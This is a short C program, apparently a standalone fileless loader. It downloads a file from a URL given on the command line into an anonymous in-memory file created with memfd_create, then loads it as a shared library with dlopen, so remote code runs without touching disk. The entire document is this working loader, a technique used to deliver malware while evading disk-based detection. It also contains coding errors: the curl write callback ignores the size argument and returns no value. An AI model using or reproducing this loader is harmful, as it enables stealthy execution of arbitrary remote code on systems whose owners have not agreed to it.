#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <curl/curl.h>

static inline int memfd_create(const char *name, unsigned int flags)
{
  return syscall(__NR_memfd_create, name, flags);
}

void die(const char *msg)
{
  perror(msg);
  exit(errno);
}

size_t write_memfd(char *ptr, size_t size, size_t nmemb, int memfd)
{
  if (write(memfd, ptr, nmemb) == -1) {
    close(memfd);
    die("failed write to memfd\n");
  }
}

void load_shared_object(int memfd)
{
  char path[1024];
  snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), memfd);
  dlopen(path, RTLD_LAZY);
}

int main(int argc, char **argv)
{
  int memfd;
  char *url = argv[1];
  CURL *curl;

  memfd = memfd_create("hello.so", 1);
  if (memfd == -1) { die("failed memfed_create\n"); }

  curl = curl_easy_init();

  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, memfd);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_memfd);

  curl_easy_perform(curl);
  curl_easy_cleanup(curl);

  load_shared_object(memfd);
}

